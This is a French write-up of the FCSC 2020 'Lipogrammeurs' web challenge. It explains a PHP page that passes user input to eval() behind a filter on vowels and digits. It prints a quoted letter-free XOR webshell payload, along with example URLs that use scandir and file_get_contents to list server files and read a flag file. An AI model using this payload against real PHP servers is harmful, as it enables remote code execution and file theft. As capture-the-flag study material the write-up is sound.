<p align="center">
  <a href="" rel="noopener">
 <img style="width:50px;" src="https://france-cybersecurity-challenge.fr/files/abecee1bc8e9f22344226e697e672a7d/navbar_logo.png" alt="Project logo"></a>
</p>
<h1 align="center">Lipogrammeurs</h1>

<div align="center">

[![CTF](https://img.shields.io/badge/FCSC-2020-red.svg)](https://france-cybersecurity-challenge.fr/)
[![CTF](https://img.shields.io/badge/Catégorie-Web-yellow.svg)](#)
[![CTF](https://img.shields.io/badge/web-blue.svg)](#)
[![CTF](https://img.shields.io/badge/lipogramme-blue.svg)](#)

</div>

---

## 📝 Table des matières

- [Enoncé](#problem_statement)
- [Sources](#idea)

## 🧐 Enoncé <a name = "problem_statement"></a>

_&laquo; Vous avez trouvé cette page qui vous semble étrange. Pouvez-vous nous convaincre qu'il y a effectivement un problème en retrouvant le flag présent sur le serveur ? &raquo;_

## ⚙️ Explication du fonctionnement <a name = "problem_statement"></a>

Lorsque l'on arrive en premier lieu sur le challenge, on nous renvoie directement le code source - supposé - de la page. Nous n'avons en réalité pas moyen de savoir si la page ne contient pas de code PHP supplémentaire, étant donné qu'il s'agit probablement d'un ```echo()``` ou fonction similaire.

```php
<?php
    if (isset($_GET['code'])) {
        $code = substr($_GET['code'], 0, 250);
        if (preg_match('/a|e|i|o|u|y|[0-9]/i', $code)) {
            die('No way! Go away!');
        } else {
            try {
                eval($code);
            } catch (ParseError $e) {
                die('No way! Go away!');
            }
        }
    } else {
        show_source(__FILE__);
    }
```

Le code retourné a le fonctionnement suivant :<br>
1. Un paramètre ```$_GET['code']``` est appelé dans l'URL,
2. puis il est tronqué à une longueur maximale de 250 caractères via une fonction ```substr()```
3. ensuite, la chaîne d'entrée est filtrée par une expression régulière qui empêche l'utilisation de _voyelles_ et de _chiffres (0 à 9)_.
4. Si la chaîne ne contient aucun caractère interdit, elle est exécutée au travers de la fonction ```eval()```. <br/>Cette fonction est en réalité **très** intéressante car elle exécute la chaîne qu'on lui donne comme code PHP.
5. Si la chaîne entrée à travers ```eval()``` contient des erreurs de syntaxe, le script renvoie également une erreur.
6. Si aucun paramètre ```$_GET['code']``` n'est appelé, le script appelle la fonction ```show_source()``` qui est supposée afficher la source du script.

Ce script constitue en réalité ce que l'on appelle un _webshell_, c'est à dire un accès dérobé au shell du serveur hôte via le web. En effet, la fonction ```system()```de PHP permet d'exécuter n'importe quelle commande sur le serveur hôte.

C'est donc dans cette direction qu'il faut explorer.

## 🎯 Résolution du challenge <a name = "problem_statement"></a>

Après quelques recherches, on tombe sur un script très intéressant hébergé sur GitHub Gists :
```php
<?=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);
// $_GET[_]($_GET[__]);


<?=$_="`{{{"^"?<>/";${$_}[_](${$_}[__](${$_}[___]));
// http://3.1.8.39:10002/uploads/blablabla123-shell.php?_=print_r&__=scandir&___=..
//http://3.1.8.39:10002/blablabla123-shell.php?_=print_r&__=file_get_contents&___=../flag.php
```

Comme on peut le remarquer, ce _webshell_ a l'énorme avantage d'injecter un paramètre dépourvu de lettres et chiffres, ce qui permet d'outrepasser le filtre voyelles/chiffres. De plus, le travail nous a déjà été bien simplifié, car des exemples d'utilisation sont donnés;
* le premier utilise la fonction ```scandir()``` qui va permettre d'explorer l'arborescence des fichiers du serveur web et de retrouver le fichier contenant le flag.
* le second va permettre de retourner le contenu du fichier lorsque son nom/emplacement seront connus.



## ⛓️ Sources <a name = "limitations"></a>

CyberChef : https://gchq.github.io/CyberChef/<br>
DocPHP : https://www.php.net/manual/fr/<br>
PHP Mini Webshell without Letters and Numbers (40 characters) :
https://gist.github.com/bilabar/aa25879110d29fce9b153d283b2642ed
